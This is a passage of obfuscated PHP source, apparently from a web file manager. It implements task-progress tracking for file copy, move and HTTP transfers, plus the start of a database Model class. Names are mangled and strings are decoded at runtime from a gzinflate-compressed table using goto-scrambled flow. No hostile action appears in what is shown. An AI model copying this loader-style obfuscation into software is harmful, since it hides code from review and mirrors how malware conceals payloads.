$this->task; if (!$¢Àæ –î) { return; } $¢Àæ –î[$ÉŒÃ¥ßò[1675]] += $Ç¥¯±Ó¿; $¢Àæ –î[$ÉŒÃ¥ßò[1679]] = timeFloat(); if ($¢Àæ –î[$ÉŒÃ¥ßò[808]]) { if ($¢Àæ –î[$ÉŒÃ¥ßò[808]] < $¢Àæ –î[$ÉŒÃ¥ßò[1675]]) { $¢Àæ –î[$ÉŒÃ¥ßò[808]] = $¢Àæ –î[$ÉŒÃ¥ßò[1675]]; } $Ú”‡¹â = timeFloat() - $¢Àæ –î[$ÉŒÃ¥ßò[1678]] - $¢Àæ –î[$ÉŒÃ¥ßò[1681]]; if ($Ú”‡¹â <= 0) { $Ú”‡¹â = 0.001; } $¢Àæ –î[$ÉŒÃ¥ßò[1676]] = $¢Àæ –î[$ÉŒÃ¥ßò[1675]] / $¢Àæ –î[$ÉŒÃ¥ßò[808]]; $¢Àæ –î[$ÉŒÃ¥ßò[1677]] = $¢Àæ –î[$ÉŒÃ¥ßò[1675]] / $Ú”‡¹â; if ($¢Àæ –î[$ÉŒÃ¥ßò[1676]] > 0) { $¢Àæ –î[$ÉŒÃ¥ßò[1682]] = $Ú”‡¹â * (1 - $¢Àæ –î[$ÉŒÃ¥ßò[1676]]) / $¢Àæ –î[$ÉŒÃ¥ßò[1676]]; } $¢Àæ –î[$ÉŒÃ¥ßò[1682]] = $¢Àæ –î[$ÉŒÃ¥ßò[1682]] <= 0 ? 0 : $¢Àæ –î[$ÉŒÃ¥ßò[1682]]; } $this->updateAfter(); $şÜŞº† = 0.2; if (timeFloat() - $¢Àæ –î[$ÉŒÃ¥ßò[1680]] < $şÜŞº† && !$ïÇ¢®¢˜) { return; } $ØÀØ«ô = self::get($¢Àæ –î[$ÉŒÃ¥ßò[442]]); $ŸÍÔ¹Ü± = $ØÀØ«ô[$ÉŒÃ¥ßò[772]]; if ($ŸÍÔ¹Ü± == self::STATYS_KILL) { $ÇôÂ–Õ› = array($ÉŒÃ¥ßò[1692] => LNG($ÉŒÃ¥ßò[1693]), $ÉŒÃ¥ßò[1243] => !1); Cache::set($ÉŒÃ¥ßò[1694] . $this->task[$ÉŒÃ¥ßò[442]], $ÇôÂ–Õ›, 30); $this->onKill(); $this->end(); die; } else { if ($ŸÍÔ¹Ü± == self::STATYS_STOP) { $—¾Œ±¸È = 2; $ØÀØ«ô[$ÉŒÃ¥ßò[1681]] += $—¾Œ±¸È; self::valueSet($¢Àæ –î[$ÉŒÃ¥ßò[442]], $ØÀØ«ô); sleep($—¾Œ±¸È); $this->update(); return; } } $¢Àæ –î[$ÉŒÃ¥ßò[772]] = $ŸÍÔ¹Ü± ? $ŸÍÔ¹Ü± : $¢Àæ –î[$ÉŒÃ¥ßò[772]]; $¢Àæ –î[$ÉŒÃ¥ßò[1681]] = $ØÀØ«ô[$ÉŒÃ¥ßò[1681]] ? $ØÀØ«ô[$ÉŒÃ¥ßò[1681]] : 0; $¢Àæ –î[$ÉŒÃ¥ßò[1680]] = timeFloat(); Hook::trigger($ÉŒÃ¥ßò[1695], $¢Àæ –î); self::valueSet($¢Àæ –î[$ÉŒÃ¥ßò[442]], $¢Àæ –î); } public function onKillSet($ÄÍê–¹, $èúŸÀå¡ = array()) { $this->onKillCall = array($ÄÍê–¹, $èúŸÀå¡); } public function onKill() { $×™ºÕÇç =& $_SERVER[”ôÑ§ì¸]; self::log($×™ºÕÇç[1688] . $this->task[$×™ºÕÇç[442]] . $×™ºÕÇç[1696]); Hook::trigger($×™ºÕÇç[1697], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Òå¨ğ÷) { $ÙæİûÂİ =& $_SERVER[”ôÑ§ì¸]; Cache::set($ÙæİûÂİ[1694] . $this->task[$ÙæİûÂİ[442]], $Òå¨ğ÷, 60); return $Òå¨ğ÷; } public static function get($÷äæ¶Œ ) { $¬Á­™Ÿ† =& $_SERVER[”ôÑ§ì¸]; $âá…óñœ = self::valueGet($÷äæ¶Œ ); if (is_array($âá…óñœ) && $âá…óñœ[$¬Á­™Ÿ†[1698]]) { $éÄÜ˜ëĞ = ActionApply($âá…óñœ[$¬Á­™Ÿ†[1698]], array($âá…óñœ)); $âá…óñœ = is_array($éÄÜ˜ëĞ) ? $éÄÜ˜ëĞ : $âá…óñœ; } return $âá…óñœ; } public static function listData() { $÷»İà’ú = self::valueGet(); return array_sort_by($÷»İà’ú, $_SERVER[”ôÑ§ì¸][1678], !0); } public static function kill($±œ¸ı¶†) { return self::changeStatus($±œ¸ı¶†, self::STATYS_KILL); } public static function stop($ÊÄÀîÜ¦) { return self::changeStatus($ÊÄÀîÜ¦, self::STATYS_STOP); } public static function restart($ó•âß½») { return self::changeStatus($ó•âß½», self::STATYS_RUNNING); } public static function killAll() { $ÈÅ¢‚ =& $_SERVER[”ôÑ§ì¸]; $ÍêÕó¯Ş = self::listData(); foreach ($ÍêÕó¯Ş as $»Šœ•İ) { self::kill($»Šœ•İ[$ÈÅ¢‚[442]]); } sleep(2); foreach ($ÍêÕó¯Ş as $»Šœ•İ) { self::valueSet($»Šœ•İ[$ÈÅ¢‚[442]], !1); } } private static function changeStatus($¥èñÕê, $Åà‰¸‡) { $¹ÖÙéôÑ =& $_SERVER[”ôÑ§ì¸]; $‡Ö§ˆ­Î = self::valueGet($¥èñÕê); if (!$‡Ö§ˆ­Î) { return !1; } $‡Ö§ˆ­Î[$¹ÖÙéôÑ[772]] = $Åà‰¸‡; self::valueSet($¥èñÕê, $‡Ö§ˆ­Î); self::log($¹ÖÙéôÑ[1699] . $‡Ö§ˆ­Î[$¹ÖÙéôÑ[442]] . $¹ÖÙéôÑ[1700] . $Åà‰¸‡); return !0; } public static function valueGet($ÕÕŠ½®Î = false) { $¥™ÛèÓÀ =& $_SERVER[”ôÑ§ì¸]; if ($ÕÕŠ½®Î) { $§€ø…é = Model($¥™ÛèÓÀ[487])->where(array($¥™ÛèÓÀ[94] => $ÕÕŠ½®Î, $¥™ÛèÓÀ[33] => $¥™ÛèÓÀ[1102]))->find(); return $§€ø…é ? json_decode($§€ø…é[$¥™ÛèÓÀ[417]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ò¿ğº— = false) { $Ğëˆòéı =& $_SERVER[”ôÑ§ì¸]; $êú…Ãœ = array($Ğëˆòéı[33] => $Ğëˆòéı[1102]); if ($ò¿ğº—) { $êú…Ãœ[$Ğëˆòéı[1674]] = $ò¿ğº—; } $‚³ÃØãô = Model($Ğëˆòéı[487])->where($êú…Ãœ)->select(); $‚³ÃØãô = $‚³ÃØãô ? $‚³ÃØãô : array(); foreach ($‚³ÃØãô as $ß–è©ü => $³Í¯‡àß) { $‚³ÃØãô[$ß–è©ü] = json_decode($³Í¯‡àß[$Ğëˆòéı[417]], !0); } return $‚³ÃØãô; } public static function valueSet($Á–ïŸİ˜, $³Û´’¥À) { $­»„ö¬¤ =& $_SERVER[”ôÑ§ì¸]; if (!$³Û´’¥À) { return Model($­»„ö¬¤[487])->where(array($­»„ö¬¤[94] => $Á–ïŸİ˜, $­»„ö¬¤[33] => $­»„ö¬¤[1102]))->delete(); } $¥´ÂÈëê = json_encode($³Û´’¥À); if (!$¥´ÂÈëê) { ob_start(); var_dump($³Û´’¥À); $•«ğ±ìƒ = ob_get_clean(); self::log($­»„ö¬¤[1701] . json_encode_force($•«ğ±ìƒ)); } if (!$Á–ïŸİ˜ || !$³Û´’¥À[$­»„ö¬¤[442]]) { return !1; } $éáŸªë€ = array($­»„ö¬¤[33] => $­»„ö¬¤[1102], $­»„ö¬¤[1674] => USER_ID, $­»„ö¬¤[94] => $Á–ïŸİ˜, $­»„ö¬¤[417] => $¥´ÂÈëê); $¸œãû­” = $­»„ö¬¤[1702]; CacheLock::lock($¸œãû­”); Model($­»„ö¬¤[487])->add($éáŸªë€, array(), !0); CacheLock::unlock($¸œãû­”); } public static function log($Ä¾¥±˜) { if (!GLOBAL_DEBUG) { return; } write_log($Ä¾¥±˜, $_SERVER[”ôÑ§ì¸][1703]); } } class TaskFileTransfer extends Task { protected function startAfter() { $û’Éïˆ” =& $_SERVER[”ôÑ§ì¸]; $ó™¨™¹ú =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($û’Éïˆ”[1704], array($this, $û’Éïˆ”[1705])); Hook::bind($û’Éïˆ”[1254], array($this, $û’Éïˆ”[1706])); Hook::bind($û’Éïˆ”[1707], array($this, $û’Éïˆ”[1708])); Hook::bind($û’Éïˆ”[635], array($this, $û’Éïˆ”[1709])); Hook::bind($û’Éïˆ”[636], array($this, $û’Éïˆ”[1710])); Hook::bind($û’Éïˆ”[643], array($this, $û’Éïˆ”[1711])); Hook::bind($û’Éïˆ”[644], array($this, $û’Éïˆ”[1712])); Hook::bind($û’Éïˆ”[638], array($this, $û’Éïˆ”[1713])); Hook::bind($û’Éïˆ”[641], array($this, $û’Éïˆ”[1714])); Hook::bind($û’Éïˆ”[604], array($this, $û’Éïˆ”[1715])); Hook::bind($û’Éïˆ”[601], array($this, $û’Éïˆ”[1715])); Hook::bind($û’Éïˆ”[606], array($this, $û’Éïˆ”[1715])); Hook::bind($û’Éïˆ”[608], array($this, $û’Éïˆ”[1715])); Hook::bind($û’Éïˆ”[610], array($this, $û’Éïˆ”[1715])); Hook::bind($û’Éïˆ”[1716], array($this, $û’Éïˆ”[1717])); Hook::bind($û’Éïˆ”[626], array($this, $û’Éïˆ”[1718])); $this->sourceModelCopyFlag = !1; Hook::bind($û’Éïˆ”[1719], array($this, $û’Éïˆ”[1720])); Hook::bind($û’Éïˆ”[1721], array($this, $û’Éïˆ”[1722])); Hook::bind($û’Éïˆ”[1723], array($this, $û’Éïˆ”[1724])); $ó™¨™¹ú[$û’Éïˆ”[1725]] = LNG($û’Éïˆ”[1726]); $ó™¨™¹ú[$û’Éïˆ”[1727]] = 0; $ó™¨™¹ú[$û’Éïˆ”[1728]] = 0; $ó™¨™¹ú[$û’Éïˆ”[1095]] = $û’Éïˆ”[12]; $ó™¨™¹ú[$û’Éïˆ”[1729]] = $û’Éïˆ”[12]; $ó™¨™¹ú[$û’Éïˆ”[1730]] = 0; $ó™¨™¹ú[$û’Éïˆ”[1731]] = 0; $ó™¨™¹ú[$û’Éïˆ”[1732]] = 0; if (!$ó™¨™¹ú[$û’Éïˆ”[1571]]) { $ó™¨™¹ú[$û’Éïˆ”[1571]] = LNG($û’Éïˆ”[1733]); } } protected function endAfter() { $œÜüÌÑ¸ =& $_SERVER[”ôÑ§ì¸]; Hook::unbind($œÜüÌÑ¸[1704], array($this, $œÜüÌÑ¸[1705])); Hook::unbind($œÜüÌÑ¸[1254], array($this, $œÜüÌÑ¸[1706])); Hook::unbind($œÜüÌÑ¸[1707], array($this, $œÜüÌÑ¸[1708])); Hook::unbind($œÜüÌÑ¸[635], array($this, $œÜüÌÑ¸[1709])); Hook::unbind($œÜüÌÑ¸[636], array($this, $œÜüÌÑ¸[1710])); Hook::unbind($œÜüÌÑ¸[643], array($this, $œÜüÌÑ¸[1711])); Hook::unbind($œÜüÌÑ¸[644], array($this, $œÜüÌÑ¸[1712])); Hook::unbind($œÜüÌÑ¸[638], array($this, $œÜüÌÑ¸[1713])); Hook::unbind($œÜüÌÑ¸[641], array($this, $œÜüÌÑ¸[1714])); Hook::unbind($œÜüÌÑ¸[604], array($this, $œÜüÌÑ¸[1715])); Hook::unbind($œÜüÌÑ¸[601], array($this, $œÜüÌÑ¸[1715])); Hook::unbind($œÜüÌÑ¸[606], array($this, $œÜüÌÑ¸[1715])); Hook::unbind($œÜüÌÑ¸[608], array($this, $œÜüÌÑ¸[1715])); Hook::unbind($œÜüÌÑ¸[610], array($this, $œÜüÌÑ¸[1715])); Hook::unbind($œÜüÌÑ¸[1716], array($this, $œÜüÌÑ¸[1717])); Hook::unbind($œÜüÌÑ¸[626], array($this, $œÜüÌÑ¸[1718])); Hook::unbind($œÜüÌÑ¸[1719], array($this, $œÜüÌÑ¸[1720])); Hook::unbind($œÜüÌÑ¸[1721], array($this, $œÜüÌÑ¸[1722])); Hook::unbind($œÜüÌÑ¸[1723], array($this, $œÜüÌÑ¸[1724])); } public function copyMoveStart($Ú“´Ôœ, $Å¼‰Éà, $½×–É±, $Œ³û¸…Ş) { $¬¼ï¦Û„ =& $_SERVER[”ôÑ§ì¸]; self::log($¬¼ï¦Û„[1734] . $Å¼‰Éà . $¬¼ï¦Û„[70] . $Œ³û¸…Ş); $ÈÎ†àÆ = rtrim(TEMP_FILES, $¬¼ï¦Û„[8]); if (substr($Å¼‰Éà, 0, strlen($ÈÎ†àÆ)) == $ÈÎ†àÆ) { return; } if (substr($Œ³û¸…Ş, 0, strlen($ÈÎ†àÆ)) == $ÈÎ†àÆ) { return; } $å¦“‚“… =& $this->task; $å¦“‚“…[$¬¼ï¦Û„[1735]] = KodIO::transferType($Ú“´Ôœ, $½×–É±); $this->update(); } public function updateAfter() { $³Ú£²í— =& $_SERVER[”ôÑ§ì¸]; $èâòúÇª =& $this->task; if (!$èâòúÇª[$³Ú£²í—[785]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($èâòúÇª[$³Ú£²í—[1735]] == $³Ú£²í—[1346]) { return; } self::updateTask($èâòúÇª); } private static function updateTask(&$ÜºÈªÊÅ) { $°‘€©Ó‚ =& $_SERVER[”ôÑ§ì¸]; if ($ÜºÈªÊÅ[$°‘€©Ó‚[1735]] == $°‘€©Ó‚[1225] || $ÜºÈªÊÅ[$°‘€©Ó‚[1735]] == $°‘€©Ó‚[107]) { if ($ÜºÈªÊÅ[$°‘€©Ó‚[1729]]) { $ÜºÈªÊÅ[$°‘€©Ó‚[1732]] = $ÜºÈªÊÅ[$°‘€©Ó‚[1731]] + $ÜºÈªÊÅ[$°‘€©Ó‚[1728]]; } } else { if ($ÜºÈªÊÅ[$°‘€©Ó‚[1735]] == $°‘€©Ó‚[1347]) { if ($ÜºÈªÊÅ[$°‘€©Ó‚[1729]] == $°‘€©Ó‚[1225]) { $ÜºÈªÊÅ[$°‘€©Ó‚[1732]] = $ÜºÈªÊÅ[$°‘€©Ó‚[1731]] + $ÜºÈªÊÅ[$°‘€©Ó‚[1728]] * 0.5; } else { if ($ÜºÈªÊÅ[$°‘€©Ó‚[1729]] == $°‘€©Ó‚[107]) { $ÜºÈªÊÅ[$°‘€©Ó‚[1732]] = $ÜºÈªÊÅ[$°‘€©Ó‚[1731]] + $ÜºÈªÊÅ[$°‘€©Ó‚[1727]] * 0.5 + $ÜºÈªÊÅ[$°‘€©Ó‚[1728]] * 0.5; } } } } $ÜºÈªÊÅ[$°‘€©Ó‚[1676]] = $ÜºÈªÊÅ[$°‘€©Ó‚[1732]] / $ÜºÈªÊÅ[$°‘€©Ó‚[785]]; if ($ÜºÈªÊÅ[$°‘€©Ó‚[1676]] > 0) { $’¨¸´ì = timeFloat() - $ÜºÈªÊÅ[$°‘€©Ó‚[1678]] - $ÜºÈªÊÅ[$°‘€©Ó‚[1681]]; $ÜºÈªÊÅ[$°‘€©Ó‚[1682]] = $’¨¸´ì * (1 - $ÜºÈªÊÅ[$°‘€©Ó‚[1676]]) / $ÜºÈªÊÅ[$°‘€©Ó‚[1676]]; } } public function addPath($Š£›ŒÛ) { $ê†¡õ¹Ë =& $_SERVER[”ôÑ§ì¸]; if (!$Š£›ŒÛ) { return; } $ÚÍŒ›İ =& $this->task; $³¡Ò´¢’ = IO::infoWithChildren($Š£›ŒÛ); $–©Ô÷§ä = $ÚÍŒ›İ[$ê†¡õ¹Ë[1736]] ? $ÚÍŒ›İ[$ê†¡õ¹Ë[1736]][$ê†¡õ¹Ë[1737]] : 0; $ÚÍŒ›İ[$ê†¡õ¹Ë[1736]] = array($ê†¡õ¹Ë[1737] => $–©Ô÷§ä + 1, $ê†¡õ¹Ë[461] => $³¡Ò´¢’[$ê†¡õ¹Ë[32]], $ê†¡õ¹Ë[84] => $³¡Ò´¢’[$ê†¡õ¹Ë[84]], $ê†¡õ¹Ë[550] => $³¡Ò´¢’[$ê†¡õ¹Ë[550]] ? $³¡Ò´¢’[$ê†¡õ¹Ë[550]] : $³¡Ò´¢’[$ê†¡õ¹Ë[84]]); if ($³¡Ò´¢’[$ê†¡õ¹Ë[33]] == $ê†¡õ¹Ë[213]) { $ÚÍŒ›İ[$ê†¡õ¹Ë[808]] += 1; } else { $ÚÍŒ›İ[$ê†¡õ¹Ë[808]] += $³¡Ò´¢’[$ê†¡õ¹Ë[79]][$ê†¡õ¹Ë[77]]; if ($³¡Ò´¢’[$ê†¡õ¹Ë[180]]) { $ÚÍŒ›İ[$ê†¡õ¹Ë[808]] += $³¡Ò´¢’[$ê†¡õ¹Ë[79]][$ê†¡õ¹Ë[78]] + 1; } } $ÚÍŒ›İ[$ê†¡õ¹Ë[785]] += $³¡Ò´¢’[$ê†¡õ¹Ë[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ä½Ÿ¾íÒ) { } public function sourceAddHashEnd($é‡ªğüÍ) { } public function sourceAddFileStart($ãåå‰¦½) { $€»¾Î£ =& $_SERVER[”ôÑ§ì¸]; $Ïçì¦ëÑ =& $this->task; $Ïçì¦ëÑ[$€»¾Î£[1727]] = $ãåå‰¦½[$€»¾Î£[76]]; $Ïçì¦ëÑ[$€»¾Î£[1725]] = $ãåå‰¦½[$€»¾Î£[32]]; $Ïçì¦ëÑ[$€»¾Î£[1095]] = $ãåå‰¦½[$€»¾Î£[32]]; $Ïçì¦ëÑ[$€»¾Î£[1738]] = $ãåå‰¦½[$€»¾Î£[84]]; $this->update(); } public function sourceAddFileEnd($ÎÅˆõó²) { $Š¿®Ùı’ =& $_SERVER[”ôÑ§ì¸]; $´ÖäˆÕË =& $this->task; $´ÖäˆÕË[$Š¿®Ùı’[1732]] += $ÎÅˆõó²[$Š¿®Ùı’[76]]; $´ÖäˆÕË[$Š¿®Ùı’[1738]] = $ÎÅˆõó²[$Š¿®Ùı’[84]]; $this->update(1); } public function copyFileStart($Óç¾ı‚—, $¶£­ŸîÃ, $âßÛá—, $×ûêÌ¢, $ÎÍ´áÁ×, $ëÎÙ¢¯) { $ù°ş¯–‘ =& $_SERVER[”ôÑ§ì¸]; $Ùìµ¤½Ê = $ÎÍ´áÁ×; if ($Ùìµ¤½Ê == $GLOBALS[$ù°ş¯–‘[1739]]) { $Ùìµ¤½Ê = $GLOBALS[$ù°ş¯–‘[1740]]; } $GLOBALS[$ù°ş¯–‘[1740]] = $ÎÍ´áÁ×; $GLOBALS[$ù°ş¯–‘[1739]] = $ëÎÙ¢¯; $Ã‡è¢çÅ =& $this->task; $Ã‡è¢çÅ[$ù°ş¯–‘[1725]] = $Ùìµ¤½Ê; $Ã‡è¢çÅ[$ù°ş¯–‘[1727]] = (int) $Óç¾ı‚—->size($¶£­ŸîÃ); $Ã‡è¢çÅ[$ù°ş¯–‘[1728]] = 0; $Ã‡è¢çÅ[$ù°ş¯–‘[1095]] = $ù°ş¯–‘[12]; $Ã‡è¢çÅ[$ù°ş¯–‘[1729]] = $ù°ş¯–‘[12]; $Ã‡è¢çÅ[$ù°ş¯–‘[1730]] = 0; $ƒ¤šÉª = $Ã‡è¢çÅ[$ù°ş¯–‘[1727]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ã‡è¢çÅ[$ù°ş¯–‘[442]] . $ù°ş¯–‘[1741]); if ($ƒ¤šÉª && file_exists(get_path_father($×ûêÌ¢))) { Cache::set($Ã‡è¢çÅ[$ù°ş¯–‘[442]] . $ù°ş¯–‘[1741], $×ûêÌ¢); $Ã‡è¢çÅ[$ù°ş¯–‘[1698]] = array($ù°ş¯–‘[1742], $ù°ş¯–‘[1743]); } $this->update(0, $ƒ¤šÉª); } public static function updateCopyLocalFileSize($ÖŠ§”‡) { $Â‡ıÂŸÕ =& $_SERVER[”ôÑ§ì¸]; $ÔÁ‘€Ó’ = Cache::get($ÖŠ§”‡[$Â‡ıÂŸÕ[442]] . $Â‡ıÂŸÕ[1741]); if (!$ÔÁ‘€Ó’ || !file_exists($ÔÁ‘€Ó’)) { return $ÖŠ§”‡; } $ÖŠ§”‡[$Â‡ıÂŸÕ[1728]] = @filesize($ÔÁ‘€Ó’); $ÖŠ§”‡[$Â‡ıÂŸÕ[1732]] += $ÖŠ§”‡[$Â‡ıÂŸÕ[1728]]; self::updateTask($ÖŠ§”‡); return $ÖŠ§”‡; } public function copyFileEnd($ØÁÂÀ½™, $„…ÎîË, $ƒÕû°¶², $ ¦ í‹«, $·µºëğ, $É“ÑÌ³) { $†Âºè‚ =& $_SERVER[”ôÑ§ì¸]; $Ûùıë¿ =& $this->task; $Ûùıë¿[$†Âºè‚[1728]] = $Ûùıë¿[$†Âºè‚[1727]]; $Ûùıë¿[$†Âºè‚[1729]] = $†Âºè‚[12]; unset($Ûùıë¿[$†Âºè‚[1698]]); if ($·µºëğ == $Ûùıë¿[$†Âºè‚[1725]]) { $Ûùıë¿[$†Âºè‚[1731]] += $Ûùıë¿[$†Âºè‚[1727]]; $Ûùıë¿[$†Âºè‚[1732]] = $Ûùıë¿[$†Âºè‚[1731]]; $÷†Ûî» = 1; if (isset($Ûùıë¿[$†Âºè‚[1738]]) && $Ûùıë¿[$†Âºè‚[1738]] == $„…ÎîË) { $÷†Ûî» = 0; } $this->update($÷†Ûî»); } else { $this->update(); $Ûùıë¿[$†Âºè‚[1728]] = 0; } Cache::remove($Ûùıë¿[$†Âºè‚[442]] . $†Âºè‚[1741]); self::log($†Âºè‚[1744] . $„…ÎîË . $†Âºè‚[70] . $ ¦ í‹« . $†Âºè‚[245] . $·µºëğ . $†Âºè‚[1745] . $Ûùıë¿[$†Âºè‚[1725]]); } public function updateFileEnd($š¾ñÖìĞ, $‡Œ‚ÔÀÑ) { $¬åÔİï =& $_SERVER[”ôÑ§ì¸]; $™úşÜè¼ =& $this->task; $™úşÜè¼[$¬åÔİï[1725]] = $š¾ñÖìĞ; $™úşÜè¼[$¬åÔİï[1727]] = $‡Œ‚ÔÀÑ; $™úşÜè¼[$¬åÔİï[1731]] += $‡Œ‚ÔÀÑ; $™úşÜè¼[$¬åÔİï[1732]] = $™úşÜè¼[$¬åÔİï[1731]]; $this->update(1); self::log($¬åÔİï[1746] . $š¾ñÖìĞ); } public function sourceModelCopy($²»ÁÌ£²) { $»æïÛƒ =& $_SERVER[”ôÑ§ì¸]; $Åæ©øÚ = $²»ÁÌ£²[0]; $›°„ÜØ— = $²»ÁÌ£²[1]; $ƒã¼´Ğ =& $this->task; $this->sourceModelCopyFlag = !0; $Ù„´¨õ€ = 0; switch ($Åæ©øÚ) { case $»æïÛƒ[602]: $Ù„´¨õ€ = 1; break; case $»æïÛƒ[605]: $ƒã¼´Ğ[$»æïÛƒ[1725]] = $›°„ÜØ—[$»æïÛƒ[32]]; break; case $»æïÛƒ[607]: $Ù„´¨õ€ = intval($²»ÁÌ£²[$»æïÛƒ[423]] * 0.4); break; case $»æïÛƒ[609]: $Ù„´¨õ€ = intval($²»ÁÌ£²[$»æïÛƒ[423]] * 0.2); break; case $»æïÛƒ[611]: $Ù„´¨õ€ = intval($²»ÁÌ£²[$»æïÛƒ[423]] * 0.4); break; } $this->update($Ù„´¨õ€); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Äõóëšú, $¥Ò¤¾²´) { $ÉÁ®‰´› =& $_SERVER[”ôÑ§ì¸]; $this->sourceModelCopyFlag = !0; $ä§Ôúğü = 1; if (isset($Äõóëšú[$ÉÁ®‰´›[79]])) { $ä§Ôúğü = $Äõóëšú[$ÉÁ®‰´›[79]][$ÉÁ®‰´›[77]]; $ä§Ôúğü = $ä§Ôúğü + $Äõóëšú[$ÉÁ®‰´›[79]][$ÉÁ®‰´›[78]] + 1; } $this->update($ä§Ôúğü); $this->sourceModelCopyFlag = !1; } public function sourceMove($±ƒ‰–) { $this->sourceRemove($±ƒ‰–, !1); } public function curlProgress($È¢ƒ¶ºê, $ŠÑ™üõì, $µû¥úí, $®ÙÆĞ•, $›õ±ûë…) { $í¡‘öÙ´ =& $_SERVER[”ôÑ§ì¸]; $©ùö¼ =& $this->task; if ($›õ±ûë… > 0) { $©ùö¼[$í¡‘öÙ´[1095]] = $í¡‘öÙ´[1747]; $©ùö¼[$í¡‘öÙ´[1729]] = $í¡‘öÙ´[107]; if ($©ùö¼[$í¡‘öÙ´[1727]]) { $©ùö¼[$í¡‘öÙ´[1728]] = $›õ±ûë…; } if ($©ùö¼[$í¡‘öÙ´[1730]]) { $©ùö¼[$í¡‘öÙ´[1728]] = $›õ±ûë… + $©ùö¼[$í¡‘öÙ´[1730]]; } } else { if ($µû¥úí > 0) { if ($©ùö¼[$í¡‘öÙ´[1727]] == $ŠÑ™üõì) { $©ùö¼[$í¡‘öÙ´[1728]] = $µû¥úí; $©ùö¼[$í¡‘öÙ´[1095]] = $í¡‘öÙ´[1748]; $©ùö¼[$í¡‘öÙ´[1729]] = $í¡‘öÙ´[1225]; } } } $this->update(); } public function curlProgressStart($¿¸Š©‡Š) { } public function curlProgressEnd($¥«˜í¾») { $¾–ãŞã =& $_SERVER[”ôÑ§ì¸]; $®ÀÁ™¨ =& $this->task; $ı¾£ïîş = curl_getinfo($¥«˜í¾»); $†ˆÀ¯«ü = $ı¾£ïîş[$¾–ãŞã[1749]]; if ($†ˆÀ¯«ü == -1) { $†ˆÀ¯«ü = $ı¾£ïîş[$¾–ãŞã[1750]]; } if ($®ÀÁ™¨[$¾–ãŞã[1729]] == $¾–ãŞã[107] && $†ˆÀ¯«ü) { $®ÀÁ™¨[$¾–ãŞã[1730]] += $†ˆÀ¯«ü; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $óÄˆ‡È =& $_SERVER[”ôÑ§ì¸]; $©ÃÎµ¥ñ =& $this->task; $©ÃÎµ¥ñ[$óÄˆ‡È[1751]] = 1; Hook::bind($óÄˆ‡È[1719], array($this, $óÄˆ‡È[1752])); Hook::bind($óÄˆ‡È[1721], array($this, $óÄˆ‡È[1753])); Hook::bind($óÄˆ‡È[1723], array($this, $óÄˆ‡È[1754])); } protected function endAfter() { $¨ÚËµ¤ =& $_SERVER[”ôÑ§ì¸]; Hook::unbind($¨ÚËµ¤[1719], array($this, $¨ÚËµ¤[1752])); Hook::unbind($¨ÚËµ¤[1721], array($this, $¨ÚËµ¤[1753])); Hook::unbind($¨ÚËµ¤[1723], array($this, $¨ÚËµ¤[1754])); } public function progressStart($À£³«ÅŠ) { $ï–Ûõü‰ =& $_SERVER[”ôÑ§ì¸]; $¹Úìİ’„ = curl_getinfo($À£³«ÅŠ); self::log($ï–Ûõü‰[1755] . $¹Úìİ’„[$ï–Ûõü‰[350]]); self::valueSet($this->task[$ï–Ûõü‰[442]], $this->task); } public function progressEnd($õÖê½Ô«) { $ü°İÇíü =& $_SERVER[”ôÑ§ì¸]; self::log($ü°İÇíü[1756] . $this->task[$ü°İÇíü[442]]); $this->end(); } public function progress($‰Á…¿‡º, $û±¨–Ò, $›ÚÛĞ“á, $º‹¤ØÚ, $ŸìÔ™£®) { $‡‰İáª¦ =& $_SERVER[”ôÑ§ì¸]; $Á“Ğ¢È =& $this->task; if ($ŸìÔ™£® > 0) { $Á“Ğ¢È[$‡‰İáª¦[808]] = $Á“Ğ¢È[$‡‰İáª¦[808]] == 0 ? $º‹¤ØÚ : $Á“Ğ¢È[$‡‰İáª¦[808]]; $Á“Ğ¢È[$‡‰İáª¦[1675]] = $ŸìÔ™£®; } else { if ($›ÚÛĞ“á > 0) { $Á“Ğ¢È[$‡‰İáª¦[808]] = $Á“Ğ¢È[$‡‰İáª¦[808]] == 0 ? $û±¨–Ò : $Á“Ğ¢È[$‡‰İáª¦[808]]; $Á“Ğ¢È[$‡‰İáª¦[1675]] = $›ÚÛĞ“á; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\163\163\x48\x74\164\x70\x3a\x64\157\x77\x6e\72{$›ÚÛĞ“á}\57{$û±¨–Ò}\x3b\x20\165\x70\154\x6f\x61\144\72{$ŸìÔ™£®}\57{$º‹¤ØÚ}\x3b"); } } goto FíÖ½ˆîÈŒ; c©×ÛçÄÆ: $_SERVER[§ŸîìÂù] = explode($_SERVER[”ôÑ§ì¸][649], gzinflate(substr($_SERVER[”ôÑ§ì¸][650], 10, -8))); $omypnsfugk = $_SERVER[”ôÑ§ì¸][651]; if (strlen($omypnsfugk) < $_SERVER[”ôÑ§ì¸][652]) { return; } goto eİ˜¦×ã´ª; F½Ş…ÍÙİÃ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\x65", "\157\x72\144\x65\162", "\x61\x6c\x69\x61\x73", "\x68\x61\x76\151\x6e\x67", "\147\x72\x6f\x75\160", "\x6c\x6f\143\153", "\144\151\163\x74\x69\x6e\x63\x74", "\x61\165\x74\x6f", "\146\151\154\x74\x65\x72", "\x76\141\154\151\144\x61\164\x65", "\162\x65\163\x75\x6c\164", "\142\x69\x6e\x64", "\164\157\x6b\x65\x6e"); public function __construct($•é©† = '', $€ç¬ƒòç = '', $—Šµ™•Œ = '') { $”ˆ½Ÿ½† =& 